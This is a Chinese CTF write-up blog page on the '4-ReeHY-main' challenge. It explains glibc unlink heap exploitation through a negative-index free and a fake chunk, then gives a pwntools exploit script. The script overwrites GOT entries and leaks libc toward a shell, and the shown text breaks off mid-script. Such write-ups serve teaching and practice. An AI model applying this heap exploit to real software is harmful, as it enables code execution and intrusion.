@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="Libc2.26以下的解法使用的是double free的unlink漏洞 unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。 Unsorted bin使用双向链表维护被释放的空间，如果有一个堆块准备释放，它的物理相邻地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4-ReeHY-main">
+<meta property="og:url" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="Libc2.26以下的解法使用的是double free的unlink漏洞 unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。 Unsorted bin使用双向链表维护被释放的空间，如果有一个堆块准备释放，它的物理相邻地址">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/1.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/2.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/3.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/4.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/5.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/6.png">
+<meta property="og:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/7.png">
+<meta property="article:published_time" content="2019-11-04T14:40:44.000Z">
+<meta property="article:modified_time" content="2025-06-21T04:31:18.550Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="double free">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="tcache">
+<meta property="article:tag" content="unsorted bin">
+<meta property="article:tag" content="glibc &lt;&#x3D; 2.26">
+<meta property="article:tag" content="glibc &gt;&#x3D; 2.26">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/1.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>4-ReeHY-main | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/11/04/4-ReeHY-main/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          4-ReeHY-main
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-04 22:40:44" itemprop="dateCreated datePublished" datetime="2019-11-04T22:40:44+08:00">2019-11-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 12:31:18" itemprop="dateModified" datetime="2025-06-21T12:31:18+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Libc2-26以下的解法"><a href="#Libc2-26以下的解法" class="headerlink" title="Libc2.26以下的解法"></a>Libc2.26以下的解法</h1><p>使用的是double free的unlink漏洞</p>
+<p>unlink是利用glibc malloc 的内存回收机制造成攻击的，核心就在于当两个free的堆块在物理上相邻时，会将他们合并，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并。</p>
+<p>Unsorted bin使用双向链表维护被释放的空间，如果有一个堆块准备释放，它的物理相邻地址处如果有空闲堆块，并且空闲堆块不是TOP块，则会与相邻的堆块合并，即unlink后。相当于从双向链表里删除P，这里的<strong>关键就是<br>FD-&gt;bk &#x3D; BK<br>BK-&gt;fd &#x3D; FD</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123; \  </span></span><br><span class="line"> FD = P-&gt;fd; \  </span><br><span class="line"> BK = P-&gt;bk; \  </span><br><span class="line"> <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \  </span><br><span class="line">   malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); \  </span><br><span class="line"> <span class="keyword">else</span> &#123; \  </span><br><span class="line">   FD-&gt;bk = BK; \  </span><br><span class="line">   BK-&gt;fd = FD; \  </span><br><span class="line">   ........  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
+<p>以本题为例</p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/1.png" class="" title="1.png">
+
+<p><strong>0x6020E0</strong>处是一个数组，用于保存4个堆的地址，<strong>当我们需要编辑时，程序从这个数组里找到对应的堆地址，去访问。假如我们有办法让这个数组里存的是其他地址(比如某些函数的GOT表地址)，那么当我们编辑的时候，不就可以对GOT表修改了吗。</strong></p>
+<p>那么，我们如何做到修改这个数组的内容呢?这个数组只有在创建堆的时候，才有赋值。</p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/2.png" class="" title="2.png">
+
+<p>我们可以利用unlink，<strong>先想办法让数组里某一个堆地址指向这个数组的附近，那么我们对那个堆编辑时就是编辑这个数组附近的那个地址。</strong></p>
+<p>假如我们有一个这样的堆</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Chunk0(空闲)</span><br><span class="line">Prevsize=0   size=0x101</span><br><span class="line">Fd =0x6020C8  BK =0x6020D0</span><br><span class="line">DATA=XXXXXXXXXXXXXXXXXXXX</span><br><span class="line">Chunk1(使用中)</span><br><span class="line">Prevsize=0x100 size=0x100</span><br><span class="line">DATA=xxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+<p>那么，当我们释放chunk1的时候,会与chunk0发生unlink</p>
+<p>首先，内存管理程序检查chunk1的size&#x3D;0x100，即最后的一个bit为0，说明前一个chunk处于空闲状态，那么，它会与前一个块发生合并，即从unsorted bin双向链表里删除前一个块，然后与自己合并后再加入unsorted bin</p>
+<p>那么会调用unlink(prev_chunk(chunk1),NULL,NULL)</p>
+<p>在unlink函数中<br>P &#x3D; chunk0<br>FD&#x3D;chunk0-&gt;fd &#x3D; 0x6020C8<br>BK&#x3D;chunk0-&gt;bk &#x3D; 0x6020D0</p>
+<p>根据chunk的数据结构(请看glibc源码分析)，我们可以知道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = *(FD+(8*3)) = *(0x6020E0)</span><br><span class="line">BK-&gt;fd = *(BK + (8*2)) = *(0x6020E0)</span><br><span class="line"></span><br><span class="line">而0x6020E0就是存放4个堆地址的数组的地址</span><br><span class="line">*(0x6020E0)就是数组的第一个元素，也就是堆0的地址，堆0也就是我们这里的P</span><br><span class="line">这样，绕过了corrupted double-linked list检查</span><br></pre></td></tr></table></figure>
+
+<p>接下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK即*(0x6020E0) = 0x6020D0</span><br><span class="line">BK-&gt;fd = FD即*(0x6020E0) = 0x6020C8</span><br></pre></td></tr></table></figure>
+
+<p><strong>即数组的第1个元素被我们改成了0x6020C8，也就是相当于堆0指向了0x6020C8</strong></p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/3.png" class="" title="3.png">
+
+<p><strong>那么，我们编辑堆0也就是在编辑0x6020C8处，而此处的下方就是保存堆指针的数组，那么就可以构造payload来修改这个数组，这就是原理</strong></p>
+<p>通过以上分析，我们可以这样，在真正的chunk0里，构造一个假的chunk，并伪造它的状态为释放的状态。</p>
+<p><strong>要达到这个目的，就需要堆溢出，覆盖chunk1的头信息</strong></p>
+<p>首先，这个程序的delete功能没有检查下标为负数的情况</p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/4.png" class="" title="4.png">
+
+<p>经过调试，当我们delete(-2)时，释放的正好是0x6020C0处元素指向的堆(保存4个堆大小的堆)</p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/5.png" class="" title="5.png">
+
+<p>它的大小为0x14，释放后归于fastbin</p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/6.png" class="" title="6.png">
+
+<p><strong>当我们再次malloc(0x14)申请时，便会返回这个释放后的堆的地址(fastbin的特性，使用单向链表维护释放后的块，再次申请时最先返回最后放入的那个块，类似于栈)，于是我们编辑申请的这个堆，就是编辑保存4个堆大小的堆，这个大小信息在 编辑功能时会用到，我们要先溢出堆，就需要修改大小限制</strong></p>
+<img src="/ha1vk/2019/11/04/4-ReeHY-main/7.png" class="" title="7.png">
+
+<p>我们edit申请的这个堆，构造payload，修改第一个堆的大小信息为0x200，这样我们在edit第一个堆时，就能溢出了</p>
+<p>那么接下来，就是构造假的堆，来触发unlink了。</p>
+<p>Chunk1的prev_size和size也是关键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define prev_chunk(p) ((mchunkptr)( ((char*)(p)) - ((p)-&gt;prev_size) ))  </span><br></pre></td></tr></table></figure>
+
+<p>Chunk1的地址减去prev_size就是chunk0,还有就是size的最后1个bit为0，代表前一个块chunk0处于空闲状态</p>
+<p><strong>实际上，真正的chunk0是chunk1-0x110，因为chunk0也有prev_size和size字段，我们这里构造假的空闲chunk0’，并且chunk1的prev_size为0x100，让系统误以为chunk0是在chunk1-0x100处开始的，这就骗过了系统。</strong></p>
+<p><strong>至于那个假的chunk的fd和bk，它的值关键，既要绕过检测，也要达到我们的目的。这里有一个公式，假如，被unlink的块P指针的地址为Paddr，那么设置fd&#x3D;Paddr – 0x18，设置bk &#x3D; Paddr – 0x10，根据chunk的数据结构可以很容易推出，最终导致P的指针指向了Paddr – 0x18</strong></p>
+<p>那么接下来，我们就可以修改数组里保存的4个堆指针了，让它们指向一些关键的地方。<br>然后再分别edit(0,xx),edit(1,xxx),edit(2,xxx),edit(3,xxxx)，修改关键地方的数据。比如修改got表。最终getshell。</p>
+<p>我们完整的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="comment">#注意glib 2.26开始，加入了tcache机制，本方案不在试用，但仍然可以利用其它方案  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">sh = process(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)  </span><br><span class="line"><span class="comment">#elf = ELF(&#x27;./4-ReeHY-main&#x27;)  </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#sh = remote(&#x27;111.198.29.45&#x27;,54211)  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;seaase&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,index,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input size\n&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input cun\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input content\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to dele\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Chose one to edit\n&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content\n&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#处理开始  </span></span><br><span class="line">welcome()  </span><br><span class="line"><span class="comment">#先创建两个0x100的堆(不要太大，也不要太小,这样使用unsorted bin)  </span></span><br><span class="line">create(<span class="number">0x100</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">create(<span class="number">0x100</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#delete功能没有检查下标越界,delete(-2)就是释放记录4个cun大小的那个堆空间  </span></span><br><span class="line">delete(-<span class="number">2</span>)  </span><br><span class="line">  </span><br><span class="line">payload = p32(<span class="number">0x200</span>) + p32(<span class="number">0x100</span>)  </span><br><span class="line"><span class="comment">#根据堆fastbin的特性，新申请的空间位于刚刚释放的那个小内存处,将覆盖原来的那个内容，相当于qword_6020C0[0] = 0x200，  </span></span><br><span class="line"><span class="comment">#这样功能3 read的时候就可以溢出堆(本来只读取那么多，现在可以多读取0x100字节)  </span></span><br><span class="line">create(<span class="number">0x14</span>,<span class="number">2</span>,payload)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#现在我们要在第一个堆里构造一个假的堆结构了  </span></span><br><span class="line"><span class="comment"># prev_size        size 末尾的1标志前一个块不空闲  </span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)  </span><br><span class="line"><span class="comment"># FD 和 BK分别是后一个块的指针和前一个块的指针,构成双向链表  </span></span><br><span class="line"><span class="comment"># if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))  </span></span><br><span class="line"><span class="comment">#  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);  </span></span><br><span class="line"><span class="comment">#为了绕过验证，首先  </span></span><br><span class="line"><span class="comment"># FD = *(P + size + 0x10)  </span></span><br><span class="line"><span class="comment"># BK = *(P - Prev_Size + 0x18)  </span></span><br><span class="line"><span class="comment"># FD-&gt;bk = *(P + size + 0x10) - FD-&gt;Prev_Size + 0X18  </span></span><br><span class="line"><span class="comment"># BK-&gt;fd = *(P - Prev_Size + 0x18) + BK-&gt;size + 0x10  </span></span><br><span class="line"><span class="comment"># 上面即检测双向链表的完整性  </span></span><br><span class="line"><span class="comment"># 如果通过  </span></span><br><span class="line"><span class="comment"># unlink里的关键代码  </span></span><br><span class="line"><span class="comment">#   FD-&gt;bk = BK;  </span></span><br><span class="line"><span class="comment">#   BK-&gt;fd = FD;  </span></span><br><span class="line"><span class="comment"># 我们现在的目的是，利用这两个指针修改的操作，来修改我们想要的位置  </span></span><br><span class="line"><span class="comment"># 这个程序中，在0x6020E0是一个数组，用来保存着4个堆的指针  </span></span><br><span class="line"><span class="comment"># 如果我们想办法把这些堆指针改成某些函数的got表地址，那么我们下次read时，数据就会覆盖got表  </span></span><br><span class="line"><span class="comment"># 因此,如果 (P + size + 0x10) = 0x6020E0 ，(P - Prev_Size + 0x18) = 0x6020E0  </span></span><br><span class="line"><span class="comment"># 即P + size = 0x6020D0，P - Prev_Size = 0x6020C8  </span></span><br><span class="line"><span class="comment"># 即BK = 0x6020D0 ，FD = 0x6020C8  </span></span><br><span class="line"><span class="comment"># 即P-&gt;fd = 0x6020C8，P-&gt;bk = 0x6020D0  </span></span><br><span class="line"><span class="comment"># 现在，主角是P，我们让第一个堆为主角  </span></span><br><span class="line">payload += p64(<span class="number">0x6020C8</span>) + p64(<span class="number">0x6020D0</span>)  </span><br><span class="line"><span class="comment">#填充满第一个块  </span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x100</span>-<span class="number">4</span>*<span class="number">8</span>);  </span><br><span class="line"><span class="comment">#溢出到第二个块  </span></span><br><span class="line"><span class="comment"># prev_size   size  </span></span><br><span class="line"><span class="comment"># 对于使用中的块，它的结构是这样的  </span></span><br><span class="line"><span class="comment"># prev_size 8 byte  </span></span><br><span class="line"><span class="comment"># size 8 byte  </span></span><br><span class="line"><span class="comment">#修改第二个块的Prev_Size，造成前一个块被释放的假象  </span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x100</span> + <span class="number">2</span> * <span class="number">8</span>)  </span><br><span class="line"><span class="comment">#发送payload，修改堆结构  </span></span><br><span class="line">edit(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#现在我们调用delete(1)释放第二个块，它会和我们伪造的块进行unlink合并  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#   执行  </span></span><br><span class="line"><span class="comment">#   FD-&gt;bk = BK;  </span></span><br><span class="line"><span class="comment">#   BK-&gt;fd = FD;  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#   即*(0x6020C8+0x18) = 0x6020D0  </span></span><br><span class="line"><span class="comment">#     *(0x6020D0 + 0x10) = 0x6020C8  </span></span><br><span class="line"><span class="comment">#   最终即0x6020E0 = 0x6020C8  </span></span><br><span class="line"><span class="comment">#  这样，由于0x6020E0处是用于保存第1个堆指针的，现在被我们指向了0x6020C8处，于是我们向第1个堆输入数据都会存于这里  </span></span><br><span class="line"><span class="comment">#触发unlink  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)  </span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="comment">#于是，我们可以根据结构，布局payload来覆盖0x6020E04处的几个堆的指针  </span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x18</span>   <span class="comment">#padding  </span></span><br><span class="line">payload += p64(free_got) + p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(puts_got) + p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(atoi_got) + p64(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#执行后，前3个堆指针都被我们指向了几个函数的got地址处  </span></span><br><span class="line">edit(<span class="number">0</span>,payload)  </span><br><span class="line"><span class="comment">#修改free的got地址为puts的plt地址  </span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt))  </span><br><span class="line"><span class="comment">#即调用puts_plt(puts_got)，泄露puts的加载地址  </span></span><br><span class="line">delete(<span class="number">1</span>)  </span><br><span class="line">puts_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line">  </span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span 